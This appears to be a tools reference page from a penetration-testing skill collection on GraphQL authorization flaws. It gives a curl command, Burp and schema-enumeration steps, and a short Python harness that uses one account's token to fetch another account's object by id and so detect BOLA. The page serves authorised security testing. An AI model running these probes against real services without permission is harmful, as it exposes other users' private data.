# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`graphql-security-resolver-authorization`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -X POST https://target.example/graphql -H 'Authorization: Bearer A' -H 'Content-Type: application/json' -d '{"query":"{ node(id:\"B\"){ id } }"}'` | Request another principal's object with account A's token | Cross-platform |
| `Burp Suite Repeater` | `Swap the object id and bearer token between two accounts on the same query` | Run the two-account ownership differential | Cross-platform |
| `graphql-path-enum` | `graphql-path-enum -i schema.json -t User` | Find alternate schema paths such as node or interfaces that reach a gated type | Linux, macOS, Windows |

## Minimal Script Shape

A two-account BOLA harness: with one account's token it requests its own object and a foreign object by id and reports whether the foreign object was returned.

```python
import json, sys, urllib.request

ENDPOINT = "https://target.example/graphql"

def gql(token, obj_id):
    q = '{ node(id: "%s") { id } }' % obj_id
    body = json.dumps({"query": q}).encode()
    req = urllib.request.Request(ENDPOINT, data=body, method="POST", headers={
        "Content-Type": "application/json", "Authorization": "Bearer " + token,
        "User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode("utf-8", "replace"))

token_a, own_id, foreign_id = sys.argv[1], sys.argv[2], sys.argv[3]
own = gql(token_a, own_id)
foreign = gql(token_a, foreign_id)
leaked = foreign.get("data", {}).get("node") is not None
print({"self_ok": own.get("data", {}).get("node") is not None,
       "foreign_returned": leaked, "bola_suspected": leaked})
```
